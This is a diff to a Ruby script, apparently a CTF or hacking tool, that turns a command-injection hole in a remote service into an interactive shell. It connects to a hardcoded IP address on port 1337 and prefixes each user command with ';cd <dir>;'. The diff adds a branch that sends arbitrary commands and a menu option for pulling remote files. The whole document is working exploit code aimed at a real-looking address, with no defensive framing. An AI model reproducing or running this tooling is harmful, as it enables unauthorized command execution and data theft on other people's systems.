@@ -1,5 +1,10 @@
 #!/usr/bin/ruby
 
+IP_ADDRESS = '157.230.179.99'
+PORT = 1337
+REMOTE_PROMPT = "Enter IP address: "
+CD_REGEX = /^\s*cd\s*(.+)\s*$/
+
 class CdDir
   attr_reader :path
 
@@ -36,9 +41,6 @@ class CdDir
   end
 end
 
-IP_ADDRESS = '157.230.179.99'
-PORT = 1337
-
 def shell wd
   require 'socket'
   # print a shell prompt w/ the directory
@@ -47,7 +49,6 @@ def shell wd
   # if it's a command then output the ; cd ; <command>
   # capture the output and show it on the screen for the user
   prompt = wd.path_prompt + '> '
-  cd_regex = /^\s*cd\s*(.+)\s*$/
   print prompt
   while input = gets.chomp do
     case input
@@ -57,16 +58,31 @@ def shell wd
         break
       when /^\s*exit\s*$/i
         break
-      when cd_regex
-        wd.path = cd_regex.match( input )[ 1 ]
+      when CD_REGEX
+        wd.path = CD_REGEX.match( input )[ 1 ]
         string_to_send = ";cd #{wd.path}; ls"
+      else
+        string_to_send = ";cd #{wd.path}; #{input}"
     end
+
     s = TCPSocket.new IP_ADDRESS, PORT
+    puts s.gets
+    puts s.gets
+    #if s.read == REMOTE_PROMPT
+    #  puts "Sending #{string_to_send}"
+    #  s.puts string_to_send
+    #end
+    puts s.read ( REMOTE_PROMPT.size )
+
     puts "Sending #{string_to_send}"
     s.puts string_to_send
-    puts s.gets
+
+    s.each_line do |line|
+      puts line
+    end
     print prompt
   end
+  s.close
 end
 
 def pull remote, local
@@ -74,7 +90,7 @@ def pull remote, local
   # capture output to the local file
 end
 
-menu = "Please enter a number:\n1. shell\n2. pull <remote-path> <local-path>\n3. help\n4. quit"
+menu = "Please type your selection:\n1. shell\n2. pull <remote-path> <local-path>\n3. help\n4. quit"
 
 wd = CdDir.new '/'
 
